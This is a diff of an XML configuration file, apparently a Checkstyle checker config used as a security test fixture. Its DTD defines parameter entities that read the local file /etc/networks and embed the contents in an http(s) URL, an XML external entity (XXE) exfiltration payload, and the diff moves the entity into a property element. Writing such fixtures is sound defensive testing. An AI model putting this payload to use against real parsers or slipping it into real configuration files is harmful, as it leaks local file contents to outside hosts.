@@ -3,7 +3,7 @@
         <!ELEMENT module (module|property)*>
         <!ATTLIST module name NMTOKEN #REQUIRED>
 
-        <!ELEMENT property EMPTY>
+        <!ELEMENT property ANY>
         <!ATTLIST property
                 name NMTOKEN #REQUIRED
                 value CDATA #REQUIRED
@@ -11,9 +11,7 @@
                 >
 
         <!ENTITY % payload SYSTEM "file:///etc/networks">
-        <!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "https://%payload;">'>
-        %param1;
-        %external;
+        <!ENTITY % param1 SYSTEM "http://%payload;">
     ]
 >
 
@@ -29,5 +27,5 @@
 <module name="Checker">
     <property name="charset" value="UTF-8"/>
 
-    <property name="severity" value="error"/>
+    <property name="severity" value="error">%param1;</property>
 </module>
